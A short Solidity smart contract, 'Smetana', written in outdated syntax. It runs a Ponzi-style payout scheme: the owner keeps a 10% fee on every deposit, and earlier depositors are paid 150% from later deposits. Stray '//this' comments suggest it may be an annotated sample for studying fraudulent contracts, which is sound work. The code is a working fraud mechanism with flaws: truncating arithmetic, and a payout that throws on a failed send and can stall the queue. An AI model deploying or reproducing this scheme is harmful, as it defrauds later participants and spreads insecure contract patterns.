1 contract Smetana {
2 
3     struct Participant {
4         address etherAddress;
5         uint amount;
6     }
7 
8     Participant[] public participants;
9 
10 	uint public payoutIdx = 0;
11 	uint public collectedFees = 0;
12 	uint balance = 0;
13 
14   // only owner modifier
15 	address public owner;
16     modifier onlyowner {
17         if (msg.sender != owner) throw;
18         _;
19     }//and this
20 
21   // contract Constructor
22     function Smetana() {
23         owner = msg.sender;
24     }
25 
26  // fallback function
27     function() payable {//this
28         enter();
29     }
30 
31 	function enter() payable {//this
32       // collect fee
33         uint fee = msg.value / 10;
34         collectedFees += fee;
35 
36       // add a new participant
37 		uint idx = participants.length;
38         participants.length++;
39         participants[idx].etherAddress = msg.sender;
40         participants[idx].amount = msg.value;
41 
42       // update available balance
43       	balance += msg.value - fee;
44       	
45 	  // if there are enough ether on the balance we can pay out to an earlier participant
46 	  	uint txAmount = participants[payoutIdx].amount / 100 * 150;
47         if(balance >= txAmount){
48         	if(!participants[payoutIdx].etherAddress.send(txAmount)) throw;
49 
50             balance -= txAmount;
51             payoutIdx++;
52         }
53     }
54 
55     function collectFees() onlyowner {
56         if(collectedFees == 0)return;
57 
58         if(!owner.send(collectedFees))throw;
59         collectedFees = 0;
60     }
61 
62     function setOwner(address _owner) onlyowner {
63         owner = _owner;
64     }
65 }